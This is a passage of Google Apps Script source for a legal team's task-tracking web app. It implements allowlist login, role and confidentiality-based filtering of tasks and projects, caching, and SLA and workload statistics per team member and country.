// ════════════════════════════════════════════════════════════════
// Legal Team Tracker · Google Apps Script · Web App
// RappiPlus · Global Legal · v3.6 (Collaboration & Polish)
// ════════════════════════════════════════════════════════════════

const SHEET_ID        = '19eR-pXzVLTSEdCADeBZ8fsd5x4f2t0GowUJiJm2X6ms';
const SHEET_ACTIVO    = 'Tracking Activo';
const SHEET_HISTORIAL = 'Historial';
const SHEET_CONFIG    = 'Config';
const SHEET_EQUIPOS   = 'Equipos';
const SHEET_PROYECTOS = 'Proyectos';
const SHEET_COMMENTS  = 'Comments'; // Auto-created on first use; cols: id, task_id, author_email, author_name, ts, body
const SHEET_FERIADOS  = 'Feriados'; // Manual; cols: pais (CO/MX/CR/...) | fecha (YYYY-MM-DD) | nombre
const SHEET_TEMPLATES = 'Templates'; // Optional; cols: tipoTrabajo, checklist (JSON array of strings). See sample at EOF.

// ── DAILY DIGEST ────────────────────────────────────────────────
// URL del web app deployado (/exec). Se usa en los emails del digest
// para construir deep-links como WEB_APP_URL + '?task=ID'.
// Si rotás el deployment (Deploy → Manage deployments → nuevo /exec),
// actualizá esta constante o los links del email apuntarán al
// deployment viejo. Validar contra Apps Script editor → Deploy.
const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyWIOIHZzUJ9yzk9nDYMm26FcEAVE6M-VisDHM8cqyA_ijnCG3YjeNIgVt2_MaJveYdCg/exec';
const DIGEST_TZ = 'America/Bogota';
const DIGEST_SKIP_WEEKENDS = true; // En sáb/dom el trigger corre pero hace early return.

// Tasks: 19 cols — ID,Nombre,Resp,Acc,Deadline,Prioridad,Estado,Semana,Creado,Cerrado,Notas,Proyecto(ID),País,Líder,TipoTrabajo,Riesgo,Documentos,Confidencialidad,Contraparte
// La columna 18 (Confidencialidad) puede no existir todavía en la hoja: getLastColumn() devolverá
// menos y el read defaultea a 'estandar'. Cuando el usuario agregue la columna manualmente,
// los nuevos updates se persisten ahí.
// NOTA MIGRACIÓN: las columnas TASK col 19 (Contraparte) y PROJ col 17 (ContrapartesConflicto)
// deben agregarse manualmente al sheet antes de usar; sin la columna se defaultean a vacío.
const TASK_COLS = 19;
const TASK_DOCS_COL = 17; // 1-indexed
const TASK_CONF_COL = 18; // 1-indexed
const TASK_CONTRAPARTE_COL = 19; // 1-indexed
// Projects: 17 cols — ID,Nombre,País,Líder,Responsable,Deadline,Prioridad,Estado,Descripción,Notas,Creado,Semana,Participantes,TipoTrabajo,Riesgo,Documentos,ContrapartesConflicto
const PROJ_COLS = 17;
const PROJ_DOCS_COL = 16; // 1-indexed
const PROJ_CONTRAPARTES_COL = 17; // 1-indexed

const STATUS_ORDER = {'Bloqueado':0,'En curso':1,'Pendiente':2,'En revisión':3,'Listo':4};
const PRIO_ORDER   = {'Alta':0,'Media':1,'Baja':2};

// ── CACHE ───────────────────────────────────────────────────────
// Cacheamos el snapshot completo por 30s. Cualquier escritura llama a invalidateCache().
const CACHE_KEY = 'tracker_data_v1';
const CACHE_TTL_SEC = 30;
function invalidateCache() { try { CacheService.getScriptCache().remove(CACHE_KEY); } catch(e) {} }

// ── WEB APP ─────────────────────────────────────────────────────
// doGet valida que el visitante esté en la allowlist de la hoja Equipos antes de
// renderizar el dashboard. La allowlist combina leaderEmail + emails de cada equipo.
// Requisitos de deployment:
//   - Execute as: Me (owner)
//   - Who has access: Anyone within <dominio> (o Anyone with Google account)
// Así Session.getActiveUser().getEmail() retorna el email verificado del visitante.
function doGet(e) {
  var page = e && e.parameter && e.parameter.page;

  // Endpoint /api?page=api sigue abierto para scripts internos (cambia si necesitas
  // protegerlo también; típicamente se restringe con execute-as y acceso limitado).
  if (page === 'api') {
    return ContentService.createTextOutput(JSON.stringify(getTrackerData()))
      .setMimeType(ContentService.MimeType.JSON);
  }

  // Endpoint público /exec?page=demo: sirve el HTML standalone del demo editorial.
  // Sin auth (es para presentación interna). Si en el futuro queremos cerrarlo,
  // basta con resolver el visitante antes de retornar.
  if (page === 'demo') {
    return HtmlService.createHtmlOutputFromFile('frontend/StandaloneDemo')
      .setTitle('Legal Tracker — Editorial Deep')
      .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
  }

  // 1) Autenticación: resolver el usuario visitante contra la allowlist
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var authResult = resolveVisitor(equipos);

  if (!authResult.ok) {
    return renderAccessDenied(authResult);
  }

  // 2) Determinar rol (head / manager / specialist) contra hoja Config
  var role = determineRole(authResult.email, authResult.user, config);

  // 3) Render normal, con el usuario ya resuelto y rol determinado
  var html = HtmlService.createTemplateFromFile('frontend/Dashboard');
  html.data = JSON.stringify(getEditorialData());
  html.currentUser = JSON.stringify({
    email: authResult.email,
    name:  authResult.user.name,
    code:  authResult.user.code,
    isLeader: !!authResult.user.isLeader,
    role: role
  });
  // SECURITY: por default Apps Script setea X-Frame-Options=SAMEORIGIN, lo que
  // mitiga clickjacking. Antes estaba ALLOWALL (cualquiera podía iframearlo).
  // TODO: si el equipo necesita embeberlo en Notion/Confluence, agregar selectivamente
  // ALLOWALL aquí (asumiendo el riesgo de clickjacking documentado en code review).
  return html.evaluate()
    .setTitle('Legal Tracker · Rappi')
    .addMetaTag('viewport','width=device-width, initial-scale=1');
}

function include(f){ return HtmlService.createHtmlOutputFromFile(f).getContent(); }

// ── AUTH HELPERS ────────────────────────────────────────────────
// Arma un mapa (email lowercase) → {name, code, isLeader} a partir de la hoja Equipos.
// - leaderEmail se mapea a leader
// - emails[i] se asume paralelo a members[i] (mismo orden)
// - First-wins: si un email aparece en varios equipos (ej. Eduardo es leader
//   de CO y CR), se queda con el primero del Sheet. Sin esto, la última
//   iteración pisa el código de país y el manager queda en el equipo
//   equivocado. Multi-country real queda para Fase 2.
function buildEmailAllowlist(equipos) {
  var map = {};
  equipos.forEach(function(eq) {
    if (eq.leaderEmail) {
      var le = eq.leaderEmail.toString().toLowerCase().trim();
      if (le && !map[le]) {
        map[le] = { name: eq.leader, code: eq.code, isLeader: true };
      }
    }
    for (var i = 0; i < (eq.members || []).length; i++) {
      var email = (eq.emails || [])[i];
      if (email) {
        var em = email.toString().toLowerCase().trim();
        if (em && !map[em]) {
          map[em] = { name: eq.members[i], code: eq.code, isLeader: false };
        }
      }
    }
  });
  return map;
}

// Retorna {ok:true, email, user} si el visitante tiene acceso; caso contrario
// {ok:false, reason, email} para mostrar el motivo en la página de denegado.
function resolveVisitor(equipos) {
  var email = '';
  try { email = (Session.getActiveUser().getEmail() || '').toLowerCase().trim(); } catch(e) {}
  if (!email) {
    return { ok: false, reason: 'no_session',
      message: 'No pudimos identificar tu cuenta. Asegúrate de estar logueado en Google con tu correo corporativo.' };
  }
  var allow = buildEmailAllowlist(equipos);
  var user = allow[email];
  if (!user) {
    return { ok: false, reason: 'not_allowlisted', email: email,
      message: 'Tu correo (' + email + ') no está registrado en el tracker. Pide a tu líder de equipo que lo agregue en la hoja "Equipos".' };
  }
  return { ok: true, email: email, user: user };
}

// Renderiza una página simple de "acceso denegado" con el mismo look del tracker.
function renderAccessDenied(authResult) {
  var safeMsg = (authResult.message || 'Acceso denegado').replace(/</g, '&lt;');
  var body = ''
    + '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">'
    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
    + '<title>Legal Tracker · Sin acceso</title>'
    + '<style>'
    +   'body{background:#0C0E14;color:#F0F2F8;font-family:system-ui,sans-serif;'
    +        'margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}'
    +   '.box{max-width:420px;background:#151820;border:1px solid rgba(255,255,255,.08);'
    +        'border-radius:16px;padding:40px;text-align:center}'
    +   '.logo{width:56px;height:56px;border-radius:16px;background:#FF4940;display:flex;'
    +         'align-items:center;justify-content:center;font-size:26px;margin:0 auto 20px}'
    +   'h1{font-size:20px;font-weight:800;margin:0 0 12px}'
    +   'p{color:#9099B0;font-size:13px;line-height:1.55;margin:0}'
    +   '.email{font-family:ui-monospace,monospace;color:#FFB938;word-break:break-all}'
    + '</style></head><body>'
    + '<div class="box">'
    +   '<div class="logo">🔒</div>'
    +   '<h1>Sin acceso al Legal Tracker</h1>'
    +   '<p>' + safeMsg + '</p>'
    + '</div></body></html>';
  return HtmlService.createHtmlOutput(body)
    .setTitle('Legal Tracker · Sin acceso')
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
}

// ════════════════════════════════════════════════════════════════
// GET ALL DATA
// ════════════════════════════════════════════════════════════════
// Entry point que resuelve al visitante, determina su rol y devuelve la data
// filtrada según lo que debe ver. Delega reads caros a _buildRawData()
// (cacheado) y calcula stats en memoria sobre el subset visible.
function getTrackerData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var auth = resolveVisitor(equipos);
  if (!auth.ok) throw new Error('No autorizado: ' + auth.message);
  var role = determineRole(auth.email, auth.user, config);
  var raw = _cachedRawData();
  var feriadosByCountry = _loadFeriados(ss); // 1h cache; usado en SLA biz days
  return _buildViewForRole(raw, role, auth.user, feriadosByCountry);
}

// ════════════════════════════════════════════════════════════════
// EDITORIAL DATA (extiende getTrackerData con campos derivados)
// ════════════════════════════════════════════════════════════════
// Wrapper sobre getTrackerData() que enriquece tareas, miembros del equipo
// y países con campos derivados que la nueva UI editorial consume.
// Reusa la cache de 30s vía getTrackerData(); los cálculos extra son baratos.
// NO modifica el shape original — sólo agrega campos.
function getEditorialData() {
  return _telemetry('getEditorialData', _getEditorialDataImpl);
}
function _getEditorialDataImpl() {
  var data = getTrackerData();
  var today = Utilities.formatDate(new Date(), 'America/Bogota', 'yyyy-MM-dd');

  // Cargamos feriados una vez por request — usados para etaDays (biz days) y
  // para los promedios/streak históricos (bizDays sin contar feriados del país).
  // Si la hoja Feriados no existe o está vacía, fbc = {} y el código cae en
  // fallback "solo lun-vie sin feriados" — backwards-compat total.
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var fbc = _loadFeriados(ss);

  // Enriquecer tareas activas + historial (con feriados → etaDays en biz days)
  if (data.tasks && data.tasks.length) {
    data.tasks.forEach(function(t) { _enrichTaskEditorial(t, today, { feriadosByCountry: fbc }); });
  }
  if (data.historial && data.historial.length) {
    data.historial.forEach(function(t) { _enrichTaskEditorial(t, today, { feriadosByCountry: fbc }); });
  }

  // Enriquecer miembros del team (load, capacity, overdue, blocked, streak, avgs)
  // Optimización: pre-buckear tasks/historial por resp en una pasada,
  // sino para cada miembro hacíamos un .filter() sobre el array completo
  // (O(team × n)). Ahora es O(n + team).
  if (data.team && data.team.length) {
    var SLA_BY_PRIO = { 'Alta': 2, 'Media': 5, 'Baja': 7 };
    var tasksByResp = {};
    (data.tasks || []).forEach(function(t) {
      var key = t.resp || '';
      (tasksByResp[key] = tasksByResp[key] || []).push(t);
    });
    var histByResp = {};
    (data.historial || []).forEach(function(t) {
      if (!t.resp || !t.creadoRaw || !t.cerrado) return;
      var p = t.cerrado.split('/');
      var cerradoDate = new Date(parseInt(p[2], 10), parseInt(p[1], 10) - 1, parseInt(p[0], 10));
      var ferSet = fbc[(t.pais || 'CO').toUpperCase()] || null;
      var entry = {
        priority: t.priority,
        bizDays: countBizDays(new Date(t.creadoRaw), cerradoDate, ferSet),
        cerradoDate: cerradoDate
      };
      (histByResp[t.resp] = histByResp[t.resp] || []).push(entry);
    });

    var nowMsMember = new Date().getTime();
    var THIRTY_DAYS_MS_M = 30 * 24 * 60 * 60 * 1000;

    data.team.forEach(function(member) {
      var memberTasks = tasksByResp[member.name] || [];
      var activeTasks = memberTasks.filter(function(t){ return t.status !== 'Listo' && t.status !== 'Cancelado'; });
      member.load     = activeTasks.length;
      member.capacity = 5; // TODO Fase 2: leer de hoja Config
      member.overdue  = memberTasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0; }).length;
      member.blocked  = memberTasks.filter(function(t){ return t.status === 'Bloqueado'; }).length;

      var memberHist = histByResp[member.name] || [];

      // SLA mes: % de cierres on-time en últimos 30 días. null si no hay cierres recientes
      // (la UI muestra "—" en ese caso). Usado en Home Manager y columna SLA de Mi Equipo.
      var recent30 = memberHist.filter(function(h){ return (nowMsMember - h.cerradoDate.getTime()) <= THIRTY_DAYS_MS_M; });
      if (recent30.length > 0) {
        var onTime30 = recent30.filter(function(h){ var sla = SLA_BY_PRIO[h.priority] || 5; return h.bizDays <= sla; }).length;
        member.slaPct = Math.round((onTime30 / recent30.length) * 100);
      } else {
        member.slaPct = null;
      }

      // streak: tareas cerradas a tiempo consecutivamente (más reciente → antigua).
      var streak = 0;
      var sortedDesc = memberHist.slice().sort(function(a, b){ return b.cerradoDate - a.cerradoDate; });
      for (var i = 0; i < sortedDesc.length; i++) {
        var sla = SLA_BY_PRIO[sortedDesc[i].priority] || 5;
        if (sortedDesc[i].bizDays <= sla) streak++;
        else break;
      }
      member.streak = streak;

      // Promedios por prioridad. "—" si no hay; entero → "3d", decimal → "1.5d".
      function avgFor(prio) {
        var arr = memberHist.filter(function(h){ return h.priority === prio; });
        if (!arr.length) return '—';
        var sum = arr.reduce(function(s, h){ return s + h.bizDays; }, 0);
        var avg = sum / arr.length;
        return (avg === Math.floor(avg) ? avg.toString() : avg.toFixed(1)) + 'd';
      }
      member.avgAlta  = avgFor('Alta');
      member.avgMedia = avgFor('Media');
      member.avgBaja  = avgFor('Baja');
    });
  }

  // Enriquecer countries (open, overdue, slaPct, trend)
  if (data.countries && data.countries.length) {
    var SLA_BY_PRIO_C = { 'Alta': 2, 'Media': 5, 'Baja': 7 };
    var nowMs = new Date().getTime();
    var THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
    var WEEK_MS = 7 * 24 * 60 * 60 * 1000;

    // Pre-buckear por país en una sola pasada (mismo motivo que team).
    var tasksByPais = {};
    (data.tasks || []).forEach(function(t) {
      var k = t.pais || '';
      (tasksByPais[k] = tasksByPais[k] || []).push(t);
    });
    var histByPais = {};
    (data.historial || []).forEach(function(t) {
      if (!t.pais || !t.creadoRaw || !t.cerrado) return;
      var p = t.cerrado.split('/');
      var cerradoDate = new Date(parseInt(p[2], 10), parseInt(p[1], 10) - 1, parseInt(p[0], 10));
      var ferSet = fbc[(t.pais || '').toUpperCase()] || null;
      (histByPais[t.pais] = histByPais[t.pais] || []).push({
        priority: t.priority,
        cerradoMs: cerradoDate.getTime(),
        bizDays: countBizDays(new Date(t.creadoRaw), cerradoDate, ferSet)
      });
    });

    data.countries.forEach(function(c) {
      var countryTasks = tasksByPais[c.code] || [];
      c.open     = countryTasks.filter(function(t){ return t.status !== 'Listo'; }).length;
      c.overdue  = countryTasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0 && t.status !== 'Listo'; }).length;
      c.dueToday = countryTasks.filter(function(t){ return t.etaDays === 0 && t.status !== 'Listo'; }).length;
      var countryHist = histByPais[c.code] || [];

      // slaPct: % de cierres dentro de SLA en los últimos 30 días.
      // Sin historial reciente → null (no penalizar países sin cierres).
      var recent = countryHist.filter(function(h){ return (nowMs - h.cerradoMs) <= THIRTY_DAYS_MS; });
      if (recent.length === 0) {
        c.slaPct = null;
      } else {
        var onTime = 0;
        recent.forEach(function(h) {
          var sla = SLA_BY_PRIO_C[h.priority] || 5;
          if (h.bizDays <= sla) onTime++;
        });
        c.slaPct = Math.round((onTime / recent.length) * 100);
      }

      // SLA semana actual vs semana anterior — habilita insights tipo
      // "MX cayó debajo del 90% por primera vez". null si <3 cierres.
      var thisWeek = countryHist.filter(function(h){ return (nowMs - h.cerradoMs) <= WEEK_MS; });
      var lastWeek = countryHist.filter(function(h){
        var age = nowMs - h.cerradoMs;
        return age > WEEK_MS && age <= 2 * WEEK_MS;
      });
      c.slaPctThisWeek = _slaPctOf(thisWeek, SLA_BY_PRIO_C);
      c.slaPctLastWeek = _slaPctOf(lastWeek, SLA_BY_PRIO_C);
      c.closedThisWeek = thisWeek.length;
      c.closedLastWeek = lastWeek.length;

      // trend: 12 buckets semanales, índice 11 = semana actual.
      // Proxy autorizado: cerradas por semana (throughput) en lugar de
      // tareas activas en stock. Lectura visual = velocidad de cierre.
      var trend = [0,0,0,0,0,0,0,0,0,0,0,0];
      countryHist.forEach(function(h) {
        var weeksAgo = Math.floor((nowMs - h.cerradoMs) / WEEK_MS);
        if (weeksAgo >= 0 && weeksAgo < 12) {
          trend[11 - weeksAgo]++;
        }
      });
      c.trend = trend;
    });

    // Agregados LATAM-wide para el HQ home.
    var latam = data.latam = {};
    latam.totalOpen     = data.countries.reduce(function(a,c){ return a + (c.open || 0); }, 0);
    latam.totalOverdue  = data.countries.reduce(function(a,c){ return a + (c.overdue || 0); }, 0);
    latam.totalDueToday = data.countries.reduce(function(a,c){ return a + (c.dueToday || 0); }, 0);
    latam.closedThisWeek = data.countries.reduce(function(a,c){ return a + (c.closedThisWeek || 0); }, 0);
    latam.closedLastWeek = data.countries.reduce(function(a,c){ return a + (c.closedLastWeek || 0); }, 0);
    // SLA agregado: promedio ponderado por cantidad de cierres recientes.
    var allRecent = [];
    Object.keys(histByPais).forEach(function(cc){
      (histByPais[cc] || []).forEach(function(h){
        if ((nowMs - h.cerradoMs) <= THIRTY_DAYS_MS) allRecent.push(h);
      });
    });
    latam.slaPct = allRecent.length ? _slaPctOf(allRecent, SLA_BY_PRIO_C) : null;
    // SLA esta semana vs semana anterior para LATAM completo.
    var latamThis = allRecent.filter(function(h){ return (nowMs - h.cerradoMs) <= WEEK_MS; });
    var latamPrev = allRecent.filter(function(h){
      var age = nowMs - h.cerradoMs;
      return age > WEEK_MS && age <= 2 * WEEK_MS;
    });
    latam.slaPctThisWeek = _slaPctOf(latamThis, SLA_BY_PRIO_C);
    latam.slaPctLastWeek = _slaPctOf(latamPrev, SLA_BY_PRIO_C);
  }

  // Globales
  data.today = today;
  data.roleSpecific = data.roleSpecific || {};
  data.roleSpecific.narrative = _buildNarrative(data);

  return data;
}

// Helper: % de cierres dentro de SLA dado un array de histos. null si vacío.
function _slaPctOf(histArr, slaByPrio) {
  if (!histArr || histArr.length === 0) return null;
  var onTime = 0;
  for (var i = 0; i < histArr.length; i++) {
    var h = histArr[i];
    var sla = slaByPrio[h.priority] || 5;
    if (h.bizDays <= sla) onTime++;
  }
  return Math.round((onTime / histArr.length) * 100);
}

// Calcula y agrega los campos derivados a una tarea: eta, etaDays,
// accionable, blockedReason, slaTarget. Mutación in-place.
// opts.feriadosByCountry (opcional): si presente, etaDays se calcula en días
// hábiles (lun-vie excluyendo feriados del país de la tarea). Si ausente,
// fallback a calendario (comportamiento histórico).
function _enrichTaskEditorial(t, todayISO, opts) {
  opts = opts || {};
  var fbc = opts.feriadosByCountry;
  // etaDays + eta humano
  if (t.deadlineISO) {
    var diff;
    if (fbc) {
      // Si la tarea no tiene país, fallback a CO (equipo activo en pre-piloto)
      // dentro de _bizDaysBetween — si CO tampoco está cargado, queda en solo lun-vie.
      diff = _bizDaysBetween(todayISO, t.deadlineISO, (t.pais || 'CO').toUpperCase(), fbc);
    } else {
      diff = _daysBetweenISO(todayISO, t.deadlineISO);
    }
    t.etaDays = diff;
    t.eta = _fmtEta(diff);
  } else {
    t.etaDays = null;
    t.eta = '';
  }

  // accionable: primera línea de notas, o derivado del estado
  var firstNoteLine = '';
  if (t.notas) {
    var lines = t.notas.toString().split(/\r?\n/);
    firstNoteLine = (lines[0] || '').trim();
  }
  if (firstNoteLine) {
    t.accionable = firstNoteLine;
  } else {
    var byStatus = {
      'Pendiente':   'Por iniciar',
      'En curso':    'Avanzar',
      'En revisión': 'Revisar',
      'Bloqueado':   'Desbloquear',
      'Listo':       'Cerrada'
    };
    t.accionable = byStatus[t.status] || '';
  }

  // blockedReason: solo cuando la tarea está bloqueada
  t.blockedReason = (t.status === 'Bloqueado') ? firstNoteLine : '';

  // slaTarget por prioridad
  var slaByPrio = { 'Alta': '2d', 'Media': '5d', 'Baja': '7d' };
  t.slaTarget = slaByPrio[t.priority] || '5d';
}

// Diferencia de días entre dos fechas ISO (YYYY-MM-DD). Resultado en días enteros.
// Negativo si endISO está en el pasado relativo a startISO.
function _daysBetweenISO(startISO, endISO) {
  var s = _parseISODate(startISO);
  var e = _parseISODate(endISO);
  if (!s || !e) return 0;
  var ms = e.getTime() - s.getTime();
  return Math.round(ms / (1000 * 60 * 60 * 24));
}

// Parsea YYYY-MM-DD como fecha local (medianoche). Evita drift de timezone.
function _parseISODate(iso) {
  if (!iso) return null;
  var m = iso.toString().match(/^(\d{4})-(\d{2})-(\d{2})/);
  if (!m) return null;
  return new Date(parseInt(m[1], 10), parseInt(m[2], 10) - 1, parseInt(m[3], 10));
}

// Convierte etaDays (int) en string humano editorial.
function _fmtEta(days) {
  if (days < 0) return 'venció hace ' + Math.abs(days) + 'd';
  if (days === 0) return 'vence HOY';
  if (days === 1) return 'mañana';
  return 'en ' + days + 'd';
}

// Genera la narrativa contextual server-side, en función del rol del visitante.
function _buildNarrative(data) {
  var role = data._role;
  var tasks = data.tasks || [];
  var active = tasks.filter(function(t){ return t.status !== 'Listo'; });
  var thisWeek = tasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays >= 0 && t.etaDays <= 7; });
  var atRisk = tasks.filter(function(t){ return (typeof t.etaDays === 'number' && t.etaDays < 0) || t.status === 'Bloqueado'; });

  if (role === 'specialist') {
    return 'Tienes ' + active.length + ' tareas activas. ' + thisWeek.length + ' vencen esta semana.';
  }
  if (role === 'manager') {
    return 'Tu equipo tiene ' + active.length + ' tareas activas. ' + atRisk.length + ' están en riesgo.';
  }
  // head / hq
  var countries = (data.countries || []).length;
  return 'LATAM tiene ' + active.length + ' tareas activas en ' + countries + ' países.';
}

// Cache solo la parte cara: lecturas del sheet. Los cálculos de stats se
// recalculan por rol (barato) porque filtramos por usuario.
function _cachedRawData() {
  try {
    var cached = CacheService.getScriptCache().get(CACHE_KEY);
    if (cached) return JSON.parse(cached);
  } catch(e) {}
  var raw = _buildRawData();
  try { CacheService.getScriptCache().put(CACHE_KEY, JSON.stringify(raw), CACHE_TTL_SEC); } catch(e) {}
  return raw;
}

// Lee del sheet todo lo que necesitamos para construir una vista, sin
// calcular stats. El caller filtra y calcula después.
function _buildRawData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var activeTasks = readTasks(ss.getSheetByName(SHEET_ACTIVO));
  var histTasks   = readTasks(ss.getSheetByName(SHEET_HISTORIAL));
  var config  = readConfig(ss);
  var equipos = readEquipos(ss);
  var projects = readProjects(ss);
  return {
    tasks: activeTasks,
    historial: histTasks,
    projects: projects,
    equipos: equipos,
    config: config,
    semana: activeTasks.length > 0 ? activeTasks[0].semana : getCurrentWeekLabel(),
    generated: Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy HH:mm')
  };
}

// ── ROLE-BASED FILTERING ─────────────────────────────────────────
// Determina el rol del visitante:
//   head       → email en config.Heads (csv, case-insensitive)
//   manager    → es líder de algún equipo (user.isLeader del allowlist)
//   specialist → resto
function determineRole(email, user, config) {
  var headsRaw = (config && config.Heads) ? config.Heads.toString() : '';
  var heads = headsRaw.toLowerCase().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
  if (heads.indexOf((email || '').toLowerCase()) >= 0) return 'head';
  if (user && user.isLeader) return 'manager';
  return 'specialist';
}

// Filtra tareas según el rol del usuario.
//   head      → todas
//   manager   → las de su país (pais === user.code, o resp en ese equipo)
//   specialist→ solo donde resp === user.name
// Después aplica un segundo filtro por confidencialidad de la tarea:
//   estandar     → visible para todo el equipo (rol OK actual)
//   restringido  → solo resp / lider / head / manager del país
//   confidencial → solo resp / lider / head
function filterTasksForRole(tasks, role, user, equipos) {
  var roleFiltered;
  if (role === 'head') {
    roleFiltered = tasks;
  } else if (role === 'manager') {
    roleFiltered = tasks.filter(function(t) {
      var cc = t.pais || getCountryForMember(t.resp, equipos);
      return cc === user.code;
    });
  } else {
    roleFiltered = tasks.filter(function(t){ return t.resp === user.name; });
  }

  // Filtro adicional por confidencialidad (server-side enforcement, no solo UI)
  return roleFiltered.filter(function(t) {
    var conf = (t.confidencialidad || 'estandar').toString().trim().toLowerCase() || 'estandar';
    if (conf === 'estandar') return true;
    if (conf === 'restringido') {
      return user.name === t.resp
          || user.name === t.lider
          || role === 'head'
          || (role === 'manager' && t.pais === user.code);
    }
    if (conf === 'confidencial') {
      return user.name === t.resp
          || user.name === t.lider
          || role === 'head';
    }
    return true;
  });
}

// Filtra proyectos según el rol.
//   head      → todos
//   manager   → los de su país (pais === user.code)
//   specialist→ donde responsable === user.name o está en participantes
function filterProjectsForRole(projects, role, user) {
  if (role === 'head') return projects;
  if (role === 'manager') {
    return projects.filter(function(p){ return p.pais === user.code; });
  }
  return projects.filter(function(p) {
    if (p.responsable === user.name) return true;
    if (p.participantes && p.participantes.indexOf(user.name) >= 0) return true;
    return false;
  });
}

// Construye la vista completa (tasks filtradas, projects filtrados, stats
// recalculadas, KPIs, SLA, team grid, countries) para un rol+usuario dado.
function _buildViewForRole(raw, role, user, feriadosByCountry) {
  feriadosByCountry = feriadosByCountry || {};
  var equipos = raw.equipos;
  var allTasks = raw.tasks;
  var allHist  = raw.historial;
  var allProjects = raw.projects;

  var tasks = filterTasksForRole(allTasks, role, user, equipos);
  var historial = filterTasksForRole(allHist, role, user, equipos);
  var projects = filterProjectsForRole(allProjects, role, user);

  // Enrich cada proyecto con sus tareas visibles y stats derivadas.
  var projMap = {};
  projects.forEach(function(p) {
    p.tasks = [];
    p.taskStats = { total:0, pendiente:0, enCurso:0, enRevision:0, bloqueado:0, listo:0, alta:0, media:0, baja:0 };
    projMap[p.id] = p;
  });
  tasks.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    projMap[pid].tasks.push(t);
    var s = projMap[pid].taskStats;
    s.total++;
    if (t.status === 'Pendiente')    s.pendiente++;
    if (t.status === 'En curso')     s.enCurso++;
    if (t.status === 'En revisión')  s.enRevision++;
    if (t.status === 'Bloqueado')    s.bloqueado++;
    if (t.status === 'Listo')        s.listo++;
    if (t.priority === 'Alta')       s.alta++;
    if (t.priority === 'Media')      s.media++;
    if (t.priority === 'Baja')       s.baja++;
  });
  historial.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    var s = projMap[pid].taskStats;
    s.total++; s.listo++;
  });
  // Auto-status de proyectos (misma lógica que antes)
  projects.forEach(function(p) {
    var s = p.taskStats;
    p.pctDone = s.total > 0 ? Math.round(s.listo / s.total * 100) : 0;
    if (p.status === 'Cancelado') return;
    if (s.total > 0 && s.listo === s.total) { p.status = 'Completado'; return; }
    if (p.statusForced) return;
    if (s.total === 0) return;
    if (s.bloqueado > 0 && s.enCurso === 0 && s.pendiente === 0 && s.enRevision === 0) p.status = 'En pausa';
    else p.status = 'Activo';
  });

  // KPIs globales sobre el subset visible
  var kpi = { total: tasks.length, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
  tasks.forEach(function(t) {
    if (t.priority === 'Alta')  kpi.alta++;
    if (t.priority === 'Media') kpi.media++;
    if (t.priority === 'Baja')  kpi.baja++;
    if (t.status === 'Pendiente')    kpi.pendiente++;
    if (t.status === 'En curso')     kpi.enCurso++;
    if (t.status === 'Bloqueado')    kpi.bloqueado++;
    if (t.status === 'En revisión')  kpi.enRevision++;
    if (t.status === 'Listo')        kpi.listo++;
  });

  // Per-person stats: construidas solo a partir de responsables visibles en tasks
  var teamMap = {};
  tasks.forEach(function(t) {
    if (!t.resp) return;
    if (!teamMap[t.resp]) teamMap[t.resp] = { total:0, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
    var p = teamMap[t.resp];
    p.total++;
    if (t.priority === 'Alta')  p.alta++;
    if (t.priority === 'Media') p.media++;
    if (t.priority === 'Baja')  p.baja++;
    if (t.status === 'Pendiente')    p.pendiente++;
    if (t.status === 'En curso')     p.enCurso++;
    if (t.status === 'Bloqueado')    p.bloqueado++;
    if (t.status === 'En revisión')  p.enRevision++;
    if (t.status === 'Listo')        p.listo++;
  });
  var team = Object.keys(teamMap).sort().map(function(name) {
    var m = teamMap[name];
    return {
      name: name,
      initials: name.split(' ').slice(0, 2).map(function(w){ return w[0]; }).join('').toUpperCase(),
      country: getCountryForMember(name, equipos),
      total: m.total, alta: m.alta, media: m.media, baja: m.baja,
      pendiente: m.pendiente, enCurso: m.enCurso, bloqueado: m.bloqueado,
      enRevision: m.enRevision, listo: m.listo,
      pctDone: m.total > 0 ? Math.round(m.listo / m.total * 100) : 0
    };
  });

  // Per-country stats: arrancamos pre-poblando con TODOS los equipos del
  // sheet Equipos (aunque no tengan tareas todavía), así HQ ve el país desde
  // el día uno sin esperar a que se creen tareas. Después las tareas suman
  // counts a los buckets ya inicializados.
  var countryMap = {};
  equipos.forEach(function(eq) {
    if (!eq || !eq.code) return;
    countryMap[eq.code] = {
      code: eq.code,
      name: eq.country || eq.code,
      leader: eq.leader || '',
      specialists: (eq.members || []).length,
      total: 0, alta: 0, media: 0, baja: 0
    };
  });
  tasks.forEach(function(t) {
    var cc = t.pais || getCountryForMember(t.resp, equipos);
    if (!cc) return;
    if (!countryMap[cc]) {
      // País con tareas pero sin entry en Equipos — agregamos placeholder.
      countryMap[cc] = { code: cc, name: cc, leader: '', specialists: 0, total: 0, alta: 0, media: 0, baja: 0 };
    }
    var c = countryMap[cc];
    c.total++;
    if (t.priority === 'Alta')  c.alta++;
    if (t.priority === 'Media') c.media++;
    if (t.priority === 'Baja')  c.baja++;
  });

  // SLA — días hábiles desde creación, restando feriados del país de la tarea.
  var now = new Date();
